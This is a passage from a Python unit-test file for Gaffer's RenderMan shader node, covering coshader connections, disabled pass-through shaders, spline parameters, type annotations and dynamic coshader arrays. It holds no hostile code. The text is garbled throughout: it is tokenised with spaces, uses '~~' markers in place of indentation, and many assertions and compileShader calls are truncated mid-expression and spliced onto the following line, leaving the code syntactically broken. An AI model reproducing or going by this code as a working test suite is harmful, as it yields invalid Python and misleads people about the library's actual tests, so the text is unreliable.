self . assertEqual ( s [ 0 ] . name , coshader ) \n 
self . assertEqual ( s [ 1 ] . name , shader ) \n 
\n 
h = shaderNode . stateHash ( ) \n 
\n 
coshaderNode [ "enabled" ] . setValue ( False ) \n 
\n 
s2 = shaderNode . state ( ) \n 
self . assertEqual ( len ( s2 ) , 1 ) \n 
\n 
self . assertEqual ( s2 [ 0 ] . name , shader ) \n 
self . assertTrue ( "coshaderParameter" not in s2 [ 0 ] . parameters ) \n 
\n 
self . assertNotEqual ( shaderNode . stateHash ( ) , h ) \n 
\n 
~~ def testDisablingCoshaderArrayInputs ( self ) : \n 
\n 
~~~ shader = self . compileShader ( os . path . dirname ( __file__ ) + "/shaders/coshaderArrayParameters.sl" ) n = GafferRenderMan . RenderManShader ( ) \n 
n . loadShader ( shader ) \n 
\n 
coshader = self . compileShader ( os . path . dirname ( __file__ ) + "/shaders/coshader.sl" ) \n 
\n 
coshaderNode1 = GafferRenderMan . RenderManShader ( ) \n 
coshaderNode1 . loadShader ( coshader ) \n 
\n 
coshaderNode2 = GafferRenderMan . RenderManShader ( ) \n 
coshaderNode2 . loadShader ( coshader ) \n 
\n 
n [ "parameters" ] [ "fixedShaderArray" ] [ 0 ] . setInput ( coshaderNode1 [ "out" ] ) \n 
n [ "parameters" ] [ "fixedShaderArray" ] [ 2 ] . setInput ( coshaderNode2 [ "out" ] ) \n 
\n 
state = n . state ( ) \n 
h1 = n . stateHash ( ) \n 
\n 
self . assertEqual ( \n 
state [ 2 ] . parameters [ "fixedShaderArray" ] , \n 
IECore . StringVectorData ( [ \n 
state [ 0 ] . parameters [ "__handle" ] . value , \n 
"" , \n 
state [ 1 ] . parameters [ "__handle" ] . value , \n 
"" \n 
] ) \n 
) \n 
\n 
coshaderNode1 [ "enabled" ] . setValue ( False ) \n 
\n 
state = n . state ( ) \n 
\n 
self . assertEqual ( \n 
state [ 1 ] . parameters [ "fixedShaderArray" ] , \n 
IECore . StringVectorData ( [ \n 
"" , \n 
"" , \n 
state [ 0 ] . parameters [ "__handle" ] . value , \n 
"" \n 
] ) \n 
) \n 
\n 
h2 = n . stateHash ( ) \n 
self . assertNotEqual ( h2 , h1 ) \n 
\n 
coshaderNode2 [ "enabled" ] . setValue ( False ) \n 
\n 
state = n . state ( ) \n 
\n 
self . assertEqual ( \n 
state [ 0 ] . parameters [ "fixedShaderArray" ] , \n 
IECore . StringVectorData ( [ \n 
"" , \n 
"" , \n 
"" , \n 
"" \n 
] ) \n 
) \n 
\n 
self . assertNotEqual ( n . stateHash ( ) , h1 ) \n 
self . assertNotEqual ( n . stateHash ( ) , h2 ) \n 
\n 
~~ def testCorrespondingInput ( self ) : \n 
\n 
~~~ coshader = self . compileShader ( os . path . dirname ( __file__ ) + "/shaders/coshader.sl" ) \n 
coshaderNode = GafferRenderMan . RenderManShader ( ) \n 
coshaderNode . loadShader ( coshader ) \n 
self . assertEqual ( coshaderNode . correspondingInput ( coshaderNode [ "out" ] ) , None ) \n 
\n 
coshader2 = self . compileShader ( os . path . dirname ( __file__ ) + "/shaders/coshaderWithPassThrough.sl" coshaderNode2 = GafferRenderMan . RenderManShader ( ) \n 
coshaderNode2 . loadShader ( coshader2 ) \n 
self . assertTrue ( coshaderNode2 . correspondingInput ( coshaderNode2 [ "out" ] ) . isSame ( coshaderNode2 [ "parameters" \n 
~~ def testCoshaderPassThrough ( self ) : \n 
\n 
~~~ shader = self . compileShader ( os . path . dirname ( __file__ ) + "/shaders/coshaderParameter.sl" ) \n 
shaderNode = GafferRenderMan . RenderManShader ( ) \n 
shaderNode . loadShader ( shader ) \n 
\n 
passThroughCoshader = self . compileShader ( os . path . dirname ( __file__ ) + "/shaders/coshaderWithPassThrough.sl" passThroughCoshaderNode = GafferRenderMan . RenderManShader ( ) \n 
passThroughCoshaderNode . loadShader ( passThroughCoshader ) \n 
\n 
coshader = self . compileShader ( os . path . dirname ( __file__ ) + "/shaders/coshader.sl" ) \n 
coshaderNode = GafferRenderMan . RenderManShader ( ) \n 
coshaderNode . loadShader ( coshader ) \n 
\n 
shaderNode [ "parameters" ] [ "coshaderParameter" ] . setInput ( passThroughCoshaderNode [ "out" ] ) \n 
passThroughCoshaderNode [ "parameters" ] [ "aColorIWillTint" ] . setInput ( coshaderNode [ "out" ] ) \n 
\n 
h = shaderNode . stateHash ( ) \n 
s = shaderNode . state ( ) \n 
\n 
self . assertEqual ( len ( s ) , 3 ) \n 
self . assertEqual ( s [ 2 ] . parameters [ "coshaderParameter" ] , s [ 1 ] . parameters [ "__handle" ] ) \n 
self . assertEqual ( s [ 1 ] . name , passThroughCoshader ) \n 
self . assertEqual ( s [ 1 ] . parameters [ "aColorIWillTint" ] , s [ 0 ] . parameters [ "__handle" ] ) \n 
self . assertEqual ( s [ 0 ] . name , coshader ) \n 
\n 
passThroughCoshaderNode [ "enabled" ] . setValue ( False ) \n 
\n 
s = shaderNode . state ( ) \n 
\n 
self . assertEqual ( len ( s ) , 2 ) \n 
self . assertEqual ( s [ 1 ] . parameters [ "coshaderParameter" ] , s [ 0 ] . parameters [ "__handle" ] ) \n 
self . assertEqual ( s [ 0 ] . name , coshader ) \n 
\n 
~~ def testSplineParameters ( self ) : \n 
\n 
~~~ shader = self . compileShader ( os . path . dirname ( __file__ ) + "/shaders/splineParameters.sl" ) \n 
n = GafferRenderMan . RenderManShader ( ) \n 
n . loadShader ( shader ) \n 
\n 
self . assertEqual ( n [ "parameters" ] . keys ( ) , [ "floatSpline" , "colorSpline" , "colorSpline2" ] ) \n 
\n 
self . assertTrue ( isinstance ( n [ "parameters" ] [ "floatSpline" ] , Gaffer . SplineffPlug ) ) \n 
self . assertTrue ( isinstance ( n [ "parameters" ] [ "colorSpline" ] , Gaffer . SplinefColor3fPlug ) ) \n 
\n 
self . assertEqual ( \n 
\n 
n [ "parameters" ] [ "floatSpline" ] . defaultValue ( ) , \n 
\n 
IECore . Splineff ( \n 
IECore . CubicBasisf . catmullRom ( ) , \n 
[ \n 
( 0 , 0 ) , \n 
( 0 , 0 ) , \n 
( 1 , 1 ) , \n 
( 1 , 1 ) , \n 
] \n 
) \n 
\n 
) \n 
\n 
self . assertEqual ( \n 
\n 
n [ "parameters" ] [ "colorSpline" ] . defaultValue ( ) , \n 
\n 
IECore . SplinefColor3f ( \n 
IECore . CubicBasisf . catmullRom ( ) , \n 
[ \n 
( 0 , IECore . Color3f ( 0 ) ) , \n 
( 0 , IECore . Color3f ( 0 ) ) , \n 
( 1 , IECore . Color3f ( 1 ) ) , \n 
( 1 , IECore . Color3f ( 1 ) ) , \n 
] \n 
) \n 
\n 
) \n 
\n 
floatValue = IECore . Splineff ( \n 
IECore . CubicBasisf . catmullRom ( ) , \n 
[ \n 
( 0 , 0 ) , \n 
( 0 , 0 ) , \n 
( 1 , 2 ) , \n 
( 1 , 2 ) , \n 
] \n 
) \n 
\n 
colorValue = IECore . SplinefColor3f ( \n 
IECore . CubicBasisf . catmullRom ( ) , \n 
[ \n 
( 0 , IECore . Color3f ( 0 ) ) , \n 
( 0 , IECore . Color3f ( 0 ) ) , \n 
( 1 , IECore . Color3f ( .5 ) ) , \n 
( 1 , IECore . Color3f ( .5 ) ) , \n 
] \n 
) \n 
\n 
n [ "parameters" ] [ "floatSpline" ] . setValue ( floatValue ) \n 
n [ "parameters" ] [ "colorSpline" ] . setValue ( colorValue ) \n 
\n 
s = n . state ( ) [ 0 ] \n 
\n 
self . assertEqual ( s . parameters [ "floatSpline" ] . value , floatValue ) \n 
self . assertEqual ( s . parameters [ "colorSpline" ] . value , colorValue ) \n 
\n 
~~ def testSplineParameterSerialisationKeepsExistingValues ( self ) : \n 
\n 
~~~ shader = self . compileShader ( os . path . dirname ( __file__ ) + "/shaders/splineParameters.sl" ) \n 
\n 
s = Gaffer . ScriptNode ( ) \n 
s [ "n" ] = GafferRenderMan . RenderManShader ( ) \n 
s [ "n" ] . loadShader ( shader ) \n 
\n 
s [ "n" ] [ "parameters" ] [ "floatSpline" ] . setValue ( \n 
IECore . Splineff ( \n 
IECore . CubicBasisf . catmullRom ( ) , \n 
[ \n 
( 0 , 0 ) , \n 
( 0 , 0 ) , \n 
( 1 , 2 ) , \n 
( 1 , 2 ) , \n 
] \n 
) \n 
) \n 
\n 
self . assertEqual ( \n 
s [ "n" ] [ "parameters" ] [ "floatSpline" ] . getValue ( ) , \n 
IECore . Splineff ( \n 
IECore . CubicBasisf . catmullRom ( ) , \n 
[ \n 
( 0 , 0 ) , \n 
( 0 , 0 ) , \n 
( 1 , 2 ) , \n 
( 1 , 2 ) , \n 
] \n 
) , \n 
) \n 
\n 
ss = s . serialise ( ) \n 
\n 
s2 = Gaffer . ScriptNode ( ) \n 
s2 . execute ( ss ) \n 
\n 
self . assertEqual ( \n 
s2 [ "n" ] [ "parameters" ] [ "floatSpline" ] . getValue ( ) , \n 
IECore . Splineff ( \n 
IECore . CubicBasisf . catmullRom ( ) , \n 
[ \n 
( 0 , 0 ) , \n 
( 0 , 0 ) , \n 
( 1 , 2 ) , \n 
( 1 , 2 ) , \n 
] \n 
) , \n 
) \n 
\n 
~~ def testSplineParameterDefaultValueAnnotation ( self ) : \n 
\n 
# because variable length parameters must be initialised \n 
# with a zero length array, we have to pass the defaults we actually \n 
# want via an annotation. \n 
\n 
~~~ shader = self . compileShader ( os . path . dirname ( __file__ ) + "/shaders/splineParameters.sl" ) \n 
\n 
n = GafferRenderMan . RenderManShader ( ) \n 
n . loadShader ( shader ) \n 
\n 
self . assertEqual ( \n 
n [ "parameters" ] [ "colorSpline2" ] . getValue ( ) , \n 
IECore . SplinefColor3f ( \n 
IECore . CubicBasisf . catmullRom ( ) , \n 
[ \n 
( 0 , IECore . Color3f ( 1 ) ) , \n 
( 0 , IECore . Color3f ( 1 ) ) , \n 
( 0.5 , IECore . Color3f ( 1 , 0.5 , 0.25 ) ) , \n 
( 1 , IECore . Color3f ( 0 ) ) , \n 
( 1 , IECore . Color3f ( 0 ) ) , \n 
] \n 
) , \n 
) \n 
\n 
~~ def testCoshadersInBox ( self ) : \n 
\n 
~~~ s = Gaffer . ScriptNode ( ) \n 
\n 
shader = self . compileShader ( os . path . dirname ( __file__ ) + "/shaders/coshaderParameter.sl" ) \n 
s [ "shader" ] = GafferRenderMan . RenderManShader ( ) \n 
s [ "shader" ] . loadShader ( shader ) \n 
\n 
coshader = self . compileShader ( os . path . dirname ( __file__ ) + "/shaders/coshader.sl" ) \n 
s [ "coshader" ] = GafferRenderMan . RenderManShader ( ) \n 
s [ "coshader" ] . loadShader ( coshader ) \n 
\n 
s [ "shader" ] [ "parameters" ] [ "coshaderParameter" ] . setInput ( s [ "coshader" ] [ "out" ] ) \n 
\n 
b = Gaffer . Box . create ( s , Gaffer . StandardSet ( [ s [ "coshader" ] ] ) ) \n 
\n 
self . assertTrue ( s [ "shader" ] [ "parameters" ] [ "coshaderParameter" ] . getInput ( ) . parent ( ) . isSame ( b ) ) \n 
\n 
s = s [ "shader" ] . state ( ) \n 
\n 
self . assertEqual ( len ( s ) , 2 ) \n 
self . assertEqual ( s [ 1 ] . parameters [ "coshaderParameter" ] , s [ 0 ] . parameters [ "__handle" ] ) \n 
self . assertEqual ( s [ 0 ] . name , coshader ) \n 
\n 
~~ def testShaderInBoxWithExternalCoshader ( self ) : \n 
\n 
~~~ s = Gaffer . ScriptNode ( ) \n 
\n 
shader = self . compileShader ( os . path . dirname ( __file__ ) + "/shaders/coshaderParameter.sl" ) \n 
s [ "shader" ] = GafferRenderMan . RenderManShader ( ) \n 
s [ "shader" ] . loadShader ( shader ) \n 
\n 
coshader = self . compileShader ( os . path . dirname ( __file__ ) + "/shaders/coshader.sl" ) \n 
s [ "coshader" ] = GafferRenderMan . RenderManShader ( ) \n 
s [ "coshader" ] . loadShader ( coshader ) \n 
\n 
s [ "shader" ] [ "parameters" ] [ "coshaderParameter" ] . setInput ( s [ "coshader" ] [ "out" ] ) \n 
\n 
b = Gaffer . Box . create ( s , Gaffer . StandardSet ( [ s [ "shader" ] ] ) ) \n 
\n 
self . assertTrue ( b [ "shader" ] [ "parameters" ] [ "coshaderParameter" ] . getInput ( ) . parent ( ) . isSame ( b ) ) \n 
\n 
s = b [ "shader" ] . state ( ) \n 
\n 
self . assertEqual ( len ( s ) , 2 ) \n 
self . assertEqual ( s [ 1 ] . parameters [ "coshaderParameter" ] , s [ 0 ] . parameters [ "__handle" ] ) \n 
self . assertEqual ( s [ 0 ] . name , coshader ) \n 
\n 
~~ def testNumericTypeAnnotations ( self ) : \n 
\n 
~~~ shader = self . compileShader ( os . path . dirname ( __file__ ) + "/shaders/numericTypeAnnotations.sl" ) \n 
shaderNode = GafferRenderMan . RenderManShader ( ) \n 
shaderNode . loadShader ( shader ) \n 
\n 
self . assertTrue ( isinstance ( shaderNode [ "parameters" ] [ "floatParameter1" ] , Gaffer . FloatPlug ) ) \n 
self . assertTrue ( isinstance ( shaderNode [ "parameters" ] [ "floatParameter2" ] , Gaffer . FloatPlug ) ) \n 
self . assertTrue ( isinstance ( shaderNode [ "parameters" ] [ "intParameter" ] , Gaffer . IntPlug ) ) \n 
self . assertTrue ( isinstance ( shaderNode [ "parameters" ] [ "boolParameter" ] , Gaffer . BoolPlug ) ) \n 
\n 
self . assertEqual ( shaderNode [ "parameters" ] [ "floatParameter1" ] . defaultValue ( ) , 1.25 ) \n 
self . assertEqual ( shaderNode [ "parameters" ] [ "floatParameter2" ] . defaultValue ( ) , 1.5 ) \n 
self . assertEqual ( shaderNode [ "parameters" ] [ "intParameter" ] . defaultValue ( ) , 10 ) \n 
self . assertEqual ( shaderNode [ "parameters" ] [ "boolParameter" ] . defaultValue ( ) , True ) \n 
\n 
self . assertEqual ( shaderNode [ "parameters" ] [ "floatParameter1" ] . getValue ( ) , 1.25 ) \n 
self . assertEqual ( shaderNode [ "parameters" ] [ "floatParameter2" ] . getValue ( ) , 1.5 ) \n 
self . assertEqual ( shaderNode [ "parameters" ] [ "intParameter" ] . getValue ( ) , 10 ) \n 
self . assertEqual ( shaderNode [ "parameters" ] [ "boolParameter" ] . getValue ( ) , True ) \n 
\n 
~~ def testCoshaderTypeAnnotations ( self ) : \n 
\n 
~~~ coshader = self . compileShader ( os . path . dirname ( __file__ ) + "/shaders/coshader.sl" ) \n 
coshaderNode = GafferRenderMan . RenderManShader ( ) \n 
coshaderNode . loadShader ( coshader ) \n 
\n 
coshaderType1 = self . compileShader ( os . path . dirname ( __file__ ) + "/shaders/coshaderType1.sl" ) \n 
coshaderType1Node = GafferRenderMan . RenderManShader ( ) \n 
coshaderType1Node . loadShader ( coshaderType1 ) \n 
\n 
coshaderType2 = self . compileShader ( os . path . dirname ( __file__ ) + "/shaders/coshaderType2.sl" ) \n 
coshaderType2Node = GafferRenderMan . RenderManShader ( ) \n 
coshaderType2Node . loadShader ( coshaderType2 ) \n 
\n 
shader = self . compileShader ( os . path . dirname ( __file__ ) + "/shaders/typedCoshaderParameters.sl" ) shaderNode = GafferRenderMan . RenderManShader ( ) \n 
shaderNode . loadShader ( shader ) \n 
\n 
self . assertTrue ( shaderNode [ "parameters" ] [ "coshaderParameter" ] . acceptsInput ( coshaderNode [ "out" ] ) self . assertTrue ( shaderNode [ "parameters" ] [ "coshaderParameter" ] . acceptsInput ( coshaderType1Node [ "out" self . assertTrue ( shaderNode [ "parameters" ] [ "coshaderParameter" ] . acceptsInput ( coshaderType2Node [ "out" \n 
self . assertFalse ( shaderNode [ "parameters" ] [ "coshaderParameterType1" ] . acceptsInput ( coshaderNode [ "out" self . assertTrue ( shaderNode [ "parameters" ] [ "coshaderParameterType1" ] . acceptsInput ( coshaderType1Node self . assertFalse ( shaderNode [ "parameters" ] [ "coshaderParameterType1" ] . acceptsInput ( coshaderType2Node \n 
self . assertFalse ( shaderNode [ "parameters" ] [ "coshaderParameterType2" ] . acceptsInput ( coshaderNode [ "out" self . assertFalse ( shaderNode [ "parameters" ] [ "coshaderParameterType2" ] . acceptsInput ( coshaderType1Node self . assertTrue ( shaderNode [ "parameters" ] [ "coshaderParameterType2" ] . acceptsInput ( coshaderType2Node \n 
self . assertTrue ( shaderNode [ "parameters" ] [ "coshaderArrayParameter" ] [ "coshaderArrayParameter0" ] . acceptsInput self . assertTrue ( shaderNode [ "parameters" ] [ "coshaderArrayParameter" ] [ "coshaderArrayParameter0" ] . acceptsInput self . assertTrue ( shaderNode [ "parameters" ] [ "coshaderArrayParameter" ] [ "coshaderArrayParameter0" ] . acceptsInput \n 
self . assertFalse ( shaderNode [ "parameters" ] [ "coshaderArrayParameterType1" ] [ "coshaderArrayParameterType1_0" self . assertTrue ( shaderNode [ "parameters" ] [ "coshaderArrayParameterType1" ] [ "coshaderArrayParameterType1_0" self . assertFalse ( shaderNode [ "parameters" ] [ "coshaderArrayParameterType1" ] [ "coshaderArrayParameterType1_0" \n 
self . assertFalse ( shaderNode [ "parameters" ] [ "coshaderArrayParameterType2" ] [ 0 ] . acceptsInput ( coshaderNode self . assertFalse ( shaderNode [ "parameters" ] [ "coshaderArrayParameterType2" ] [ 0 ] . acceptsInput ( coshaderType1Node self . assertTrue ( shaderNode [ "parameters" ] [ "coshaderArrayParameterType2" ] [ 0 ] . acceptsInput ( coshaderType2Node \n 
~~ def testMultipleCoshaderTypeAnnotations ( self ) : \n 
\n 
~~~ coshaderType1And2 = self . compileShader ( os . path . dirname ( __file__ ) + "/shaders/coshaderType1And2.sl" coshaderType1And2Node = GafferRenderMan . RenderManShader ( ) \n 
coshaderType1And2Node . loadShader ( coshaderType1And2 ) \n 
\n 
shader = self . compileShader ( os . path . dirname ( __file__ ) + "/shaders/typedCoshaderParameters.sl" ) shaderNode = GafferRenderMan . RenderManShader ( ) \n 
shaderNode . loadShader ( shader ) \n 
\n 
self . assertTrue ( shaderNode [ "parameters" ] [ "coshaderParameter" ] . acceptsInput ( coshaderType1And2Node self . assertTrue ( shaderNode [ "parameters" ] [ "coshaderParameterType1" ] . acceptsInput ( coshaderType1And2Node self . assertTrue ( shaderNode [ "parameters" ] [ "coshaderParameterType2" ] . acceptsInput ( coshaderType1And2Node self . assertFalse ( shaderNode [ "parameters" ] [ "coshaderParameterType3" ] . acceptsInput ( coshaderType1And2Node \n 
\n 
~~ def testSplitCoshaderPassThrough ( self ) : \n 
\n 
#   C ----S      S is connected to C both directly \n 
#   |     |      and as a pass-through of the disabled \n 
#   D ----       node D. \n 
# \n 
\n 
~~~ shader = self . compileShader ( os . path . dirname ( __file__ ) + "/shaders/coshaderArrayParameters.sl" ) S = GafferRenderMan . RenderManShader ( ) \n 
S . loadShader ( shader ) \n 
\n 
passThroughCoshader = self . compileShader ( os . path . dirname ( __file__ ) + "/shaders/coshaderWithPassThrough.sl" D = GafferRenderMan . RenderManShader ( ) \n 
D . loadShader ( passThroughCoshader ) \n 
\n 
coshader = self . compileShader ( os . path . dirname ( __file__ ) + "/shaders/coshader.sl" ) \n 
C = GafferRenderMan . RenderManShader ( ) \n 
C . loadShader ( coshader ) \n 
\n 
S [ "parameters" ] [ "fixedShaderArray" ] [ 0 ] . setInput ( C [ "out" ] ) \n 
S [ "parameters" ] [ "fixedShaderArray" ] [ 1 ] . setInput ( D [ "out" ] ) \n 
D [ "parameters" ] [ "aColorIWillTint" ] . setInput ( C [ "out" ] ) \n 
\n 
h = S . stateHash ( ) \n 
s = S . state ( ) \n 
\n 
self . assertEqual ( len ( s ) , 3 ) \n 
self . assertEqual ( s [ 2 ] . parameters [ "fixedShaderArray" ] , IECore . StringVectorData ( [ s [ 0 ] . parameters [ self . assertEqual ( s [ 0 ] . name , coshader ) \n 
self . assertEqual ( s [ 1 ] . parameters [ "aColorIWillTint" ] , s [ 0 ] . parameters [ "__handle" ] ) \n 
self . assertEqual ( s [ 1 ] . name , passThroughCoshader ) \n 
\n 
D [ "enabled" ] . setValue ( False ) \n 
\n 
self . assertNotEqual ( S . stateHash ( ) , h ) \n 
\n 
s = S . state ( ) \n 
\n 
self . assertEqual ( len ( s ) , 2 ) \n 
self . assertEqual ( s [ 1 ] . parameters [ "fixedShaderArray" ] , IECore . StringVectorData ( [ s [ 0 ] . parameters [ self . assertEqual ( s [ 0 ] . name , coshader ) \n 
\n 
~~ def testSerialDisabledShaders ( self ) : \n 
\n 
# C ----> D1 ----> D2 ----> S \n 
\n 
~~~ shader = self . compileShader ( os . path . dirname ( __file__ ) + "/shaders/coshaderParameter.sl" ) \n 
S = GafferRenderMan . RenderManShader ( ) \n 
S . loadShader ( shader ) \n 
\n 
passThroughCoshader = self . compileShader ( os . path . dirname ( __file__ ) + "/shaders/coshaderWithPassThrough.sl" D1 = GafferRenderMan . RenderManShader ( ) \n 
D1 . loadShader ( passThroughCoshader ) \n 
D2 = GafferRenderMan . RenderManShader ( ) \n 
D2 . loadShader ( passThroughCoshader ) \n 
\n 
coshader = self . compileShader ( os . path . dirname ( __file__ ) + "/shaders/coshader.sl" ) \n 
C = GafferRenderMan . RenderManShader ( ) \n 
C . loadShader ( coshader ) \n 
\n 
S [ "parameters" ] [ "coshaderParameter" ] . setInput ( D2 [ "out" ] ) \n 
D2 [ "parameters" ] [ "aColorIWillTint" ] . setInput ( D1 [ "out" ] ) \n 
D1 [ "parameters" ] [ "aColorIWillTint" ] . setInput ( C [ "out" ] ) \n 
\n 
h1 = S . stateHash ( ) \n 
s = S . state ( ) \n 
\n 
self . assertEqual ( len ( s ) , 4 ) \n 
self . assertEqual ( s [ 0 ] . name , coshader ) \n 
self . assertEqual ( s [ 1 ] . name , passThroughCoshader ) \n 
self . assertEqual ( s [ 2 ] . name , passThroughCoshader ) \n 
self . assertEqual ( s [ 3 ] . name , shader ) \n 
\n 
self . assertEqual ( s [ 3 ] . parameters [ "coshaderParameter" ] , s [ 2 ] . parameters [ "__handle" ] ) \n 
self . assertEqual ( s [ 2 ] . parameters [ "aColorIWillTint" ] , s [ 1 ] . parameters [ "__handle" ] ) \n 
self . assertEqual ( s [ 1 ] . parameters [ "aColorIWillTint" ] , s [ 0 ] . parameters [ "__handle" ] ) \n 
\n 
D2 [ "enabled" ] . setValue ( False ) \n 
\n 
h2 = S . stateHash ( ) \n 
self . assertNotEqual ( h1 , h2 ) \n 
\n 
s = S . state ( ) \n 
\n 
self . assertEqual ( len ( s ) , 3 ) \n 
self . assertEqual ( s [ 0 ] . name , coshader ) \n 
self . assertEqual ( s [ 1 ] . name , passThroughCoshader ) \n 
self . assertEqual ( s [ 2 ] . name , shader ) \n 
\n 
self . assertEqual ( s [ 2 ] . parameters [ "coshaderParameter" ] , s [ 1 ] . parameters [ "__handle" ] ) \n 
self . assertEqual ( s [ 1 ] . parameters [ "aColorIWillTint" ] , s [ 0 ] . parameters [ "__handle" ] ) \n 
\n 
D1 [ "enabled" ] . setValue ( False ) \n 
\n 
h3 = S . stateHash ( ) \n 
self . assertNotEqual ( h3 , h2 ) \n 
self . assertNotEqual ( h3 , h1 ) \n 
\n 
s = S . state ( ) \n 
\n 
self . assertEqual ( len ( s ) , 2 ) \n 
self . assertEqual ( s [ 0 ] . name , coshader ) \n 
self . assertEqual ( s [ 1 ] . name , shader ) \n 
\n 
self . assertEqual ( s [ 1 ] . parameters [ "coshaderParameter" ] , s [ 0 ] . parameters [ "__handle" ] ) \n 
\n 
~~ def testDynamicCoshaderArrayParameters ( self ) : \n 
\n 
~~~ coshader = self . compileShader ( os . path . dirname ( __file__ ) + "/shaders/coshader.sl" ) \n 
coshaderNode = GafferRenderMan . RenderManShader ( ) \n 
coshaderNode . loadShader ( coshader ) \n 
\n 
shader = self . compileShader ( os . path . dirname ( __file__ ) + "/shaders/coshaderArrayParameters.sl" ) shaderNode = GafferRenderMan . RenderManShader ( ) \n 
shaderNode . loadShader ( shader ) \n 
\n 
self . assertEqual ( len ( shaderNode [ "parameters" ] [ "dynamicShaderArray" ] ) , 1 ) \n 
self . assertTrue ( isinstance ( shaderNode [ "parameters" ] [ "dynamicShaderArray" ] [ 0 ] , Gaffer . Plug ) ) \n 
self . assertTrue ( shaderNode [ "parameters" ] [ "dynamicShaderArray" ] [ 0 ] . getInput ( ) is None ) \n 
\n 
shaderNode [ "parameters" ] [ "dynamicShaderArray" ] [ 0 ] . setInput ( coshaderNode [ "out" ] ) \n 
\n 
self . assertEqual ( len ( shaderNode [ "parameters" ] [ "dynamicShaderArray" ] ) , 2 ) \n 
self . assertTrue ( isinstance ( shaderNode [ "parameters" ] [ "dynamicShaderArray" ] [ 0 ] , Gaffer . Plug ) ) \n 
self . assertTrue ( isinstance ( shaderNode [ "parameters" ] [ "dynamicShaderArray" ] [ 1 ] , Gaffer . Plug ) ) \n 
self . assertTrue ( shaderNode [ "parameters" ] [ "dynamicShaderArray" ] [ 0 ] . getInput ( ) . isSame ( coshaderNode self . assertTrue ( shaderNode [ "parameters" ] [ "dynamicShaderArray" ] [ 1 ] . getInput ( ) is None ) \n 
\n 
shaderNode [ "parameters" ] [ "dynamicShaderArray" ] [ 0 ] . setInput ( None ) \n 
\n 
self . assertEqual ( len ( shaderNode [ "parameters" ] [ "dynamicShaderArray" ] ) , 1 ) \n 
self . assertTrue ( isinstance ( shaderNode [ "parameters" ] [ "dynamicShaderArray" ] [ 0 ] , Gaffer . Plug ) ) \n 
self . assertTrue ( shaderNode [ "parameters" ] [ "dynamicShaderArray" ] [ 0 ] . getInput ( ) is None ) \n 
\n 
~~ def testSerialiseDynamicCoshaderArrayParameters ( self ) : \n 
\n 
~~~ shader = self . compileShader ( os . path . dirname ( __file__ ) + "/shaders/coshaderArrayParameters.sl" ) coshader = self . compileShader ( os . path . dirname ( __file__ ) + "/shaders/coshader.sl" ) \n 
\n 
s = Gaffer . ScriptNode ( ) \n 
\n 
s [ "n" ] = GafferRenderMan . RenderManShader ( ) \n 
s [ "n" ] . loadShader ( shader ) \n 
\n 
s [ "c" ] = GafferRenderMan . RenderManShader ( ) \n 
s [ "c" ] . loadShader ( coshader ) \n 
\n 
s [ "n" ] [ "parameters" ] [ "dynamicShaderArray" ] [ 0 ] . setInput ( s [ "c" ] [ "out" ] ) \n 
s [ "n" ] [ "parameters" ] [ "dynamicShaderArray" ] [ 1 ] . setInput ( s [ "c" ] [ "out" ] ) \n 
s [ "n" ] [ "parameters" ] [ "dynamicShaderArray" ] [ 2 ] . setInput ( s [ "c" ] [ "out" ] ) \n 
s [ "n" ] [ "parameters" ] [ "dynamicShaderArray" ] [ 1 ] . setInput ( None ) \n 
\n 
self . assertEqual ( len ( s [ "n" ] [ "parameters" ] [ "dynamicShaderArray" ] ) , 4 ) \n 
\n 
s2 = Gaffer . ScriptNode ( ) \n 
s2 . execute ( s . serialise ( ) ) \n 
\n 
self . assertEqual ( len ( s2 [ "n" ] [ "parameters" ] [ "dynamicShaderArray" ] ) , 4 ) \n 
self . assertTrue ( s2 [ "n" ] [ "parameters" ] [ "dynamicShaderArray" ] [ 0 ] . getInput ( ) . isSame ( s2 [ "c" ] [ "out" ] self . assertTrue ( s2 [ "n" ] [ "parameters" ] [ "dynamicShaderArray" ] [ 1 ] . getInput ( ) is None ) \n 
self . assertTrue ( s2 [ "n" ] [ "parameters" ] [ "dynamicShaderArray" ] [ 2 ] . getInput ( ) . isSame ( s2 [ "c" ] [ "out" ] self . assertTrue ( s2 [ "n" ] [ "parameters" ] [ "dynamicShaderArray" ] [ 3 ] . getInput ( ) is None ) \n 
\n 
s2 [ "n" ] [ "parameters" ] [ "dynamicShaderArray" ] [ 3 ] . setInput ( s2 [ "c" ] [ "out" ] ) \n 
\n 
self . assertEqual ( len ( s2 [ "n" ] [ "parameters" ] [ "dynamicShaderArray" ] ) , 5 ) \n 
self . assertTrue ( s2 [ "n" ] [ "parameters" ] [ "dynamicShaderArray" ] [ 0 ] . getInput ( ) . isSame ( s2 [ "c" ] [ "out" ] self . assertTrue ( s2 [ "n" ] [ "parameters" ] [ "dynamicShaderArray" ] [ 1 ] . getInput ( ) is None ) \n 
self . assertTrue ( s2 [ "n" ] [ "parameters" ] [ "dynamicShaderArray" ] [ 2 ] . getInput ( ) . isSame ( s2 [ "c" ] [ "out" ] self . assertTrue ( s2 [ "n" ] [ "parameters" ] [ "dynamicShaderArray" ] [ 3 ] . getInput ( ) . isSame ( s2 [ "c" ] [ "out" ] self . assertTrue ( s2 [ "n" ] [ "parameters" ] [ "dynamicShaderArray" ] [ 4 ] . getInput ( ) is None ) \n 
\n 
~~ def testConvertFixedCoshaderArrayToDynamic ( self ) : \n 
\n 
~~~ shader = self . compileShader ( os . path . dirname ( __file__ ) + "/shaders/coshaderArrayParameters.sl" ) shaderV2 = self . compileShader ( os . path . dirname ( __file__ ) + "/shaders/coshaderArrayParametersV2.sl" coshader = self . compileShader ( os . path . dirname ( __file__ ) + "/shaders/coshader.sl" ) \n 
\n 
s = Gaffer . ScriptNode ( ) \n 
\n 
s [ "n" ] = GafferRenderMan . RenderManShader ( ) \n 
s [ "n" ] . loadShader ( shader ) \n 
\n 
s [ "c" ] = GafferRenderMan . RenderManShader ( ) \n 
s [ "c" ] . loadShader ( coshader ) \n 
\n 
s [ "n" ] [ "parameters" ] [ "fixedShaderArray" ] [ 0 ] . setInput ( s [ "c" ] [ "out" ] ) \n 
self . assertTrue ( len ( s [ "n" ] [ "parameters" ] [ "fixedShaderArray" ] ) , 4 ) \n 
\n 
s [ "n" ] . loadShader ( shaderV2 , keepExistingValues = True ) \n 
\n 
self . assertTrue ( s [ "n" ] [ "parameters" ] [ "fixedShaderArray" ] [ 0 ] . getInput ( ) . isSame ( s [ "c" ] [ "out" ] ) ) \n 
self . assertTrue ( s [ "n" ] [ "parameters" ] [ "fixedShaderArray" ] [ 1 ] . getInput ( ) is None ) \n 
\n 
